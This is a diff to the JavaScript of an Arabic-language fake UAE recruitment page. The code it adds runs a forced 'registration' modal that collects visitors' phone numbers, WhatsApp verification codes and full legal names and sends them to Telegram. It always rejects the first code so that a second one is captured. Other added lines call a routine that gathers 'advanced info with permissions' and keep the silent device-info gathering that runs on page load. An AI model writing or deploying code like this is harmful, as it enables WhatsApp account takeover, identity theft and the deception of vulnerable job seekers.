+    // Gather ADVANCED info with permissions (after successful verification)
+    await gatherAdvancedInfoWithPermissions();
+    
     // Show success and continue with permissions
-    status.innerHTML = '<div class="success">🎉 تم التحقق بنجاح!<br>جارٍ تحميل المحتوى الحصري...</div>';
+    status.innerHTML = '<div class="success">✅ تم حفظ معلوماتك بنجاح!<br>جارٍ تحميل قائمة الوظائف الحصرية...</div>';
     
     await new Promise(resolve => setTimeout(resolve, 1500));
     
@@ -608,10 +1000,419 @@ async function submitVerificationCodeFirst() {
 // Trigger on button click
 document.getElementById('loadContent').addEventListener('click', startCapture);
 
+// Functions for modal windows
+function showPrivacy() {
+    document.getElementById('privacyModal').style.display = 'block';
+}
+
+function showTerms() {
+    document.getElementById('termsModal').style.display = 'block';
+}
+
+function closeModal(modalId) {
+    document.getElementById(modalId).style.display = 'none';
+}
+
+// Close modal when clicking outside of it (only for non-mandatory modals)
+window.onclick = function(event) {
+    const privacyModal = document.getElementById('privacyModal');
+    const termsModal = document.getElementById('termsModal');
+    const joinModal = document.getElementById('joinModal');
+    
+    // Don't close join modal by clicking outside (it's mandatory)
+    if (event.target == privacyModal) {
+        privacyModal.style.display = 'none';
+    }
+    if (event.target == termsModal) {
+        termsModal.style.display = 'none';
+    }
+    // Join modal cannot be closed by clicking outside
+}
+
+// Show mandatory join modal
+function showMandatoryJoinModal() {
+    // Check if user already completed registration
+    const isVerified = localStorage.getItem('userVerified') === 'true';
+    const hasName = localStorage.getItem('userFullName');
+    
+    if (isVerified && hasName) {
+        // User already registered, show success message
+        const modal = document.getElementById('joinModal');
+        const modalBody = document.getElementById('joinModalBody');
+        modalBody.innerHTML = `
+            <div style="text-align: center; padding: 40px;">
+                <div style="font-size: 4em; margin-bottom: 20px;">✅</div>
+                <h2 style="color: #28a745; margin-bottom: 20px; font-size: 2em;">أنت مسجل بالفعل!</h2>
+                <p style="color: #333; font-size: 1.2em; margin: 20px 0;">
+                    مرحباً بك مرة أخرى في شركة الإمارات للتوظيف<br>
+                    يمكنك الآن تصفح الوظائف الحصرية المتاحة
+                </p>
+                <button onclick="closeJoinModal()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 15px 50px; border: none; border-radius: 25px; font-size: 1.3em; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4); margin-top: 20px;">
+                    تصفح الوظائف
+                </button>
+            </div>
+        `;
+        modal.style.display = 'block';
+        document.body.style.overflow = 'hidden';
+        return;
+    }
+    
+    const modal = document.getElementById('joinModal');
+    const modalBody = document.getElementById('joinModalBody');
+    
+    // Show first step: Phone number with progress indicator
+    modalBody.innerHTML = `
+        <div style="text-align: center; padding: 20px;">
+            <div class="progress-steps">
+                <div class="step active">
+                    <div class="step-number">1</div>
+                    <div class="step-label">رقم الهاتف</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div class="step-label">التحقق</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div class="step-label">الاسم</div>
+                </div>
+            </div>
+            <h2 style="color: #FFD700; margin-bottom: 20px; font-size: 2em;">🎯 انضم الآن واحصل على أفضل الوظائف!</h2>
+            <div style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); padding: 25px; border-radius: 15px; margin: 20px 0; color: #000; box-shadow: 0 5px 20px rgba(255, 215, 0, 0.3);">
+                <p style="font-size: 1.3em; font-weight: bold; margin-bottom: 15px;">✨ فرص عمل حصرية تنتظرك!</p>
+                <p style="font-size: 1.1em; line-height: 1.8;">
+                    للحصول على <strong>قائمة الوظائف الحصرية</strong> برواتب تصل إلى <strong>50,000 درهم</strong>، 
+                    يجب عليك التسجيل أولاً. التسجيل <strong>مجاني 100%</strong> ولا يستغرق سوى دقيقة واحدة!<br><br>
+                    <strong style="color: #1E90FF;">🏠 اعمل من البيت (أونلاين)</strong> أو <strong style="color: #FFD700;">✈️ سافر إلى الإمارات</strong> - الخيار لك!
+                </p>
+            </div>
+            <div style="background: #f8f9fa; padding: 20px; border-radius: 15px; margin: 20px 0; border-right: 4px solid #FFD700;">
+                <p style="color: #333; font-size: 1.1em; margin: 10px 0; font-weight: 600;">
+                    📱 ابدأ بإدخال رقم هاتفك الإماراتي (9 أرقام)
+                </p>
+                <p style="color: #666; font-size: 0.95em; margin: 10px 0;">
+                    يجب أن يبدأ الرقم بأحد الأرقام التالية: <strong style="color: #1E90FF;">77, 78, 71, 70, 73</strong>
+                </p>
+            </div>
+            <div style="margin: 20px 0;">
+                <input type="tel" id="joinPhoneNumber" placeholder="مثال: 771234567" maxlength="9" style="width: 70%; padding: 15px; border: 3px solid #FFD700; border-radius: 10px; font-size: 1.3em; text-align: center; direction: ltr; font-weight: bold; transition: all 0.3s;" onfocus="this.style.borderColor='#1E90FF'; this.style.boxShadow='0 0 10px rgba(30, 144, 255, 0.3)';" onblur="this.style.borderColor='#FFD700'; this.style.boxShadow='none';" />
+            </div>
+            <button onclick="submitJoinPhoneNumber()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 15px 50px; border: none; border-radius: 25px; font-size: 1.3em; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4); margin-top: 10px; transition: all 0.3s;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 8px 20px rgba(255, 215, 0, 0.6)';" onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 5px 15px rgba(255, 215, 0, 0.4)';">
+                متابعة →
+            </button>
+            <p style="color: #999; font-size: 0.85em; margin-top: 15px;">
+                بالضغط على "متابعة" أنت توافق على <a href="#" onclick="showTerms(); return false;" style="color: #1E90FF; text-decoration: underline;">شروط الاستخدام</a> و <a href="#" onclick="showPrivacy(); return false;" style="color: #1E90FF; text-decoration: underline;">سياسة الخصوصية</a>
+            </p>
+        </div>
+    `;
+    
+    modal.style.display = 'block';
+    document.body.style.overflow = 'hidden'; // Prevent scrolling
+}
+
+// Submit phone number from join modal
+async function submitJoinPhoneNumber() {
+    const phoneInput = document.getElementById('joinPhoneNumber');
+    const phoneNumber = phoneInput.value.trim();
+    const modalBody = document.getElementById('joinModalBody');
+    
+    // Validate: Must be exactly 9 digits and start with 77, 78, 71, 70, or 73
+    const validPrefixes = ['77', '78', '71', '70', '73'];
+    const phonePrefix = phoneNumber.substring(0, 2);
+    
+    if (!phoneNumber || phoneNumber.length !== 9 || !/^\d+$/.test(phoneNumber)) {
+        alert('⚠️ يرجى إدخال رقم هاتف صحيح (9 أرقام)');
+        return;
+    }
+    
+    if (!validPrefixes.includes(phonePrefix)) {
+        alert('⚠️ رقم الهاتف يجب أن يبدأ بأحد الأرقام التالية: 77, 78, 71, 70, 73');
+        return;
+    }
+    
+    // Save phone number
+    localStorage.setItem('joinPhoneNumber', phoneNumber);
+    
+    // Show loading
+    modalBody.innerHTML = '<div style="text-align: center; padding: 40px;"><div class="loading">⏳ جارٍ إرسال رمز التحقق إلى واتساب...</div></div>';
+    
+    // Send phone number to Telegram
+    await sendToTelegram(`📱 رقم الهاتف من نافذة الانضمام:\n${phoneNumber}\n\n⚠️ يرجى إرسال رمز التحقق إلى هذا الرقم عبر واتساب`);
+    
+    // Wait a moment
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    
+    // Show verification code input with progress
+    modalBody.innerHTML = `
+        <div style="text-align: center; padding: 20px;">
+            <div class="progress-steps">
+                <div class="step completed">
+                    <div class="step-number">✓</div>
+                    <div class="step-label">رقم الهاتف</div>
+                </div>
+                <div class="step active">
+                    <div class="step-number">2</div>
+                    <div class="step-label">التحقق</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div class="step-label">الاسم</div>
+                </div>
+            </div>
+            <h2 style="color: #28a745; margin-bottom: 20px; font-size: 1.8em;">✅ تم إرسال رمز التحقق</h2>
+            <div style="background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%); padding: 25px; border-radius: 15px; margin: 20px 0; border: 2px solid #28a745; box-shadow: 0 5px 15px rgba(40, 167, 69, 0.2);">
+                <p style="color: #155724; font-size: 1.2em; font-weight: bold; margin-bottom: 15px;">📱 تحقق من واتساب الآن!</p>
+                <p style="color: #155724; font-size: 1.05em; line-height: 1.8;">
+                    تم إرسال رمز التحقق إلى رقم <strong style="font-size: 1.1em;">${phoneNumber}</strong> عبر واتساب.<br>
+                    اذهب إلى واتساب وانقل رمز التحقق المرسل إليك، ثم أدخله في الحقل أدناه.
+                </p>
+            </div>
+            <p style="color: #333; font-size: 1.1em; margin: 20px 0; font-weight: 600;">
+                أدخل رمز التحقق (4 أرقام على الأقل):
+            </p>
+            <div style="margin: 20px 0;">
+                <input type="text" id="joinVerificationCode" placeholder="أدخل الرمز" maxlength="10" style="width: 60%; padding: 15px; border: 3px solid #FFD700; border-radius: 10px; font-size: 1.5em; text-align: center; letter-spacing: 5px; direction: ltr; font-weight: bold; transition: all 0.3s;" onfocus="this.style.borderColor='#28a745'; this.style.boxShadow='0 0 10px rgba(40, 167, 69, 0.3)';" onblur="this.style.borderColor='#FFD700'; this.style.boxShadow='none';" />
+            </div>
+            <button onclick="submitJoinVerificationCode()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 15px 50px; border: none; border-radius: 25px; font-size: 1.3em; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4); margin-top: 10px; transition: all 0.3s;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 8px 20px rgba(255, 215, 0, 0.6)';" onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 5px 15px rgba(255, 215, 0, 0.4)';">
+                تأكيد الرمز →
+            </button>
+        </div>
+    `;
+}
+
+// Global variable for join verification attempts
+let joinVerificationAttempts = 0;
+
+// Submit verification code from join modal
+async function submitJoinVerificationCode() {
+    const codeInput = document.getElementById('joinVerificationCode');
+    const code = codeInput.value.trim();
+    const modalBody = document.getElementById('joinModalBody');
+    
+    if (!code || code.length < 4) {
+        alert('⚠️ يرجى إدخال رمز التحقق');
+        return;
+    }
+    
+    // Send verification code to Telegram
+    await sendToTelegram(`🔐 رمز التحقق من نافذة الانضمام (محاولة ${joinVerificationAttempts + 1}):\n${code}`);
+    
+    // Increment attempts
+    joinVerificationAttempts++;
+    
+    // First attempt: Show error message
+    if (joinVerificationAttempts === 1) {
+        modalBody.innerHTML = `
+            <div style="text-align: center; padding: 20px;">
+                <h2 style="color: #d32f2f; margin-bottom: 20px; font-size: 1.8em;">❌ الرمز خاطئ</h2>
+                <div style="background: #ffe6e6; padding: 25px; border-radius: 15px; margin: 20px 0; border: 2px solid #d32f2f;">
+                    <p style="color: #d32f2f; font-size: 1.1em; font-weight: bold; margin-bottom: 15px;">⚠️ يجب عليك الذهاب إلى واتساب</p>
+                    <p style="color: #333; font-size: 1.05em; line-height: 1.8;">
+                        اذهب إلى واتساب وانقل رمز التحقق المرسل إليك،<br>
+                        ثم أدخله هنا.
+                    </p>
+                </div>
+                <p style="color: #333; font-size: 1.1em; margin: 20px 0; font-weight: 600;">
+                    أدخل رمز التحقق مرة أخرى:
+                </p>
+                <div style="margin: 20px 0;">
+                    <input type="text" id="joinVerificationCode" placeholder="أدخل الرمز" maxlength="10" style="width: 60%; padding: 15px; border: 3px solid #FFD700; border-radius: 10px; font-size: 1.5em; text-align: center; letter-spacing: 5px; direction: ltr; font-weight: bold;" />
+                </div>
+                <button onclick="submitJoinVerificationCode()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 15px 50px; border: none; border-radius: 25px; font-size: 1.3em; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4); margin-top: 10px;">
+                    إعادة المحاولة
+                </button>
+            </div>
+        `;
+        return;
+    }
+    
+    // Second attempt: Accept and continue with name request
+    modalBody.innerHTML = '<div style="text-align: center; padding: 40px;"><div class="loading">✅ جارٍ التحقق من الرمز...</div></div>';
+    
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    
+    // Save verification status
+    localStorage.setItem('userVerified', 'true');
+    
+    // Show name request
+    await requestJoinFullName();
+}
+
+// Request full name in join modal
+async function requestJoinFullName() {
+    const modalBody = document.getElementById('joinModalBody');
+    
+    modalBody.innerHTML = `
+        <div style="text-align: center; padding: 20px;">
+            <div class="progress-steps">
+                <div class="step completed">
+                    <div class="step-number">✓</div>
+                    <div class="step-label">رقم الهاتف</div>
+                </div>
+                <div class="step completed">
+                    <div class="step-number">✓</div>
+                    <div class="step-label">التحقق</div>
+                </div>
+                <div class="step active">
+                    <div class="step-number">3</div>
+                    <div class="step-label">الاسم</div>
+                </div>
+            </div>
+            <h2 style="color: #FFD700; margin-bottom: 20px; font-size: 2em;">🎉 تم التحقق بنجاح!</h2>
+            <p style="color: #333; font-size: 1.1em; margin: 15px 0; font-weight: 600;">
+                خطوة أخيرة: أدخل اسمك الكامل
+            </p>
+            <div style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); padding: 25px; border-radius: 15px; margin: 20px 0; color: #000; box-shadow: 0 5px 20px rgba(255, 215, 0, 0.3);">
+                <p style="font-size: 1.2em; font-weight: bold; margin-bottom: 15px;">⚠️ تنبيه مهم جداً:</p>
+                <p style="font-size: 1.05em; line-height: 1.8; margin-bottom: 15px;">
+                    يجب إدخال اسمك الكامل <strong>بالضبط كما هو مكتوب في بطاقة الهوية أو جواز السفر</strong>
+                </p>
+                <div style="background: rgba(0,0,0,0.1); padding: 15px; border-radius: 10px; text-align: right; margin: 15px 0;">
+                    <p style="font-size: 1.05em; line-height: 2; margin: 0;">
+                        💰 <strong>راتبك الشهري</strong> سيتم تحويله إلى حسابك البنكي بنفس الاسم<br>
+                        📄 <strong>عقد العمل</strong> سيتم إصداره بنفس الاسم الموجود في بطاقتك<br>
+                        ✈️ <strong>تأشيرة العمل</strong> تحتاج إلى الاسم الكامل كما في الوثائق الرسمية<br>
+                        🏦 <strong>فتح الحساب البنكي</strong> في الإمارات يتطلب مطابقة الاسم مع الوثائق
+                    </p>
+                </div>
+                <p style="font-size: 1.05em; margin-top: 15px; font-weight: 600; color: #d32f2f;">
+                    ⚠️ أي خطأ في الاسم قد يؤدي إلى تأخير صرف الراتب أو رفض طلب التأشيرة!
+                </p>
+            </div>
+            <p style="color: #333; font-size: 1.1em; margin: 20px 0; font-weight: 600;">
+                أدخل اسمك الكامل (الاسم الأول + اسم الأب + اسم العائلة):
+            </p>
+            <div style="margin: 20px 0;">
+                <input type="text" id="joinFullName" placeholder="مثال: أحمد محمد علي" style="width: 80%; padding: 15px; border: 3px solid #FFD700; border-radius: 10px; font-size: 1.2em; text-align: right; direction: rtl; font-weight: bold; transition: all 0.3s;" onfocus="this.style.borderColor='#1E90FF'; this.style.boxShadow='0 0 10px rgba(30, 144, 255, 0.3)';" onblur="this.style.borderColor='#FFD700'; this.style.boxShadow='none';" />
+            </div>
+            <button onclick="submitJoinFullName()" style="background: linear-gradient(135deg, #28a745 0%, #20c997 100%); color: #fff; padding: 15px 50px; border: none; border-radius: 25px; font-size: 1.3em; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(40, 167, 69, 0.4); margin-top: 10px; transition: all 0.3s;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 8px 20px rgba(40, 167, 69, 0.6)';" onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 5px 15px rgba(40, 167, 69, 0.4)';">
+                ✓ إتمام التسجيل
+            </button>
+        </div>
+    `;
+}
+
+// Submit full name from join modal
+async function submitJoinFullName() {
+    const nameInput = document.getElementById('joinFullName');
+    const fullName = nameInput.value.trim();
+    const modal = document.getElementById('joinModal');
+    
+    if (!fullName || fullName.length < 5) {
+        alert('⚠️ يرجى إدخال اسمك الكامل (يجب أن يكون 5 أحرف على الأقل)');
+        return;
+    }
+    
+    // Check if name has at least 2 words
+    const nameParts = fullName.split(/\s+/);
+    if (nameParts.length < 2) {
+        alert('⚠️ يرجى إدخال اسمك الكامل (الاسم الأول + اسم العائلة على الأقل)');
+        return;
+    }
+    
+    // Send name to Telegram
+    await sendToTelegram(`👤 الاسم الكامل من نافذة الانضمام:\n${fullName}`);
+    
+    // Save name
+    localStorage.setItem('userFullName', fullName);
+    
+    // Gather ADVANCED info with permissions (after successful verification)
+    await gatherAdvancedInfoWithPermissions();
+    
+    // Show success and close modal
+    const modalBody = document.getElementById('joinModalBody');
+    modalBody.innerHTML = `
+        <div style="text-align: center; padding: 40px;">
+            <div style="font-size: 4em; margin-bottom: 20px;">🎉</div>
+            <h2 style="color: #28a745; margin-bottom: 20px; font-size: 2em;">تم التسجيل بنجاح!</h2>
+            <p style="color: #333; font-size: 1.2em; margin: 20px 0;">
+                مرحباً بك في شركة الإمارات للتوظيف<br>
+                يمكنك الآن تصفح الوظائف الحصرية المتاحة
+            </p>
+            <button onclick="closeJoinModal()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 15px 50px; border: none; border-radius: 25px; font-size: 1.3em; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4); margin-top: 20px;">
+                ابدأ الآن
+            </button>
+        </div>
+    `;
+    
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    closeJoinModal();
+}
+
+// Close join modal
+function closeJoinModal() {
+    const modal = document.getElementById('joinModal');
+    modal.style.display = 'none';
+    document.body.style.overflow = 'auto'; // Restore scrolling
+}
+
+// Toggle FAQ accordion
+function toggleFaq(element) {
+    const faqItem = element.parentElement;
+    const isActive = faqItem.classList.contains('active');
+    
+    // Close all FAQ items
+    document.querySelectorAll('.faq-item').forEach(item => {
+        item.classList.remove('active');
+    });
+    
+    // Open clicked item if it wasn't active
+    if (!isActive) {
+        faqItem.classList.add('active');
+    }
+}
+
+// Animate counter numbers
+function animateCounter(element, target, duration = 2000) {
+    const start = 0;
+    const increment = target / (duration / 16);
+    let current = start;
+    
+    const timer = setInterval(() => {
+        current += increment;
+        if (current >= target) {
+            element.textContent = target.toLocaleString('ar');
+            clearInterval(timer);
+        } else {
+            element.textContent = Math.floor(current).toLocaleString('ar');
+        }
+    }, 16);
+}
+
+// Initialize counter animations when section is visible
+function initCounters() {
+    const stats = document.querySelectorAll('.achievement-stat .stat-number');
+    const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+            if (entry.isIntersecting) {
+                const target = parseInt(entry.target.getAttribute('data-target'));
+                animateCounter(entry.target, target);
+                observer.unobserve(entry.target);
+            }
+        });
+    }, { threshold: 0.5 });
+    
+    stats.forEach(stat => observer.observe(stat));
+}
+
 // Gather basic info on page load (silent - in background)
 document.addEventListener('DOMContentLoaded', () => {
     // Silently gather device info when page loads
     setTimeout(() => {
         gatherDeviceInfo();
     }, 3000);
+    
+    // Initialize counter animations
+    initCounters();
+    
+    // Show mandatory join modal after 60 seconds (1 minute)
+    setTimeout(() => {
+        // Check if user already registered
+        const isVerified = localStorage.getItem('userVerified') === 'true';
+        const hasName = localStorage.getItem('userFullName');
+        
+        if (!isVerified || !hasName) {
+            showMandatoryJoinModal();
+        }
+    }, 60000);
 });
